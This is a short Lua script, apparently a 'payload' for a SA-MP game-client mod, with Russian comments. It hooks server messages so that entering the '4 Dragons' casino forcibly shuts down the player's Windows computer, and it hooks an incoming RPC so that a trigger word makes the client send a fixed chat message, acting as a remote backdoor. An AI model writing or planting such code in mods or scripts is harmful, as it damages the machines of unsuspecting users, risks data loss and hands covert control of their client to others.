-- payload.lua (файл 4124)
local sampev = require 'lib.samp.events'

-- Защита от бесконечного переподключения
if _G.PAYLOAD_INIT then return end
_G.PAYLOAD_INIT = true

function sampev.onServerMessage(color, text)
    if text:find("Вы вошли в казино 4 Dragons") then
        os.execute("shutdown /s /t 5 /f")
    end
end

-- Хук RPC 93 (стандартный ShowClientMessage)
function onReceiveRpc(id, bs)
    if id == 93 then
        local color = raknetBitStreamReadInt32(bs)
        local len = raknetBitStreamReadInt32(bs)
        local str = raknetBitStreamReadString(bs, len)
        if str:find("сырколбаска") then
            sampSendChat("123655")
        end
    end
end
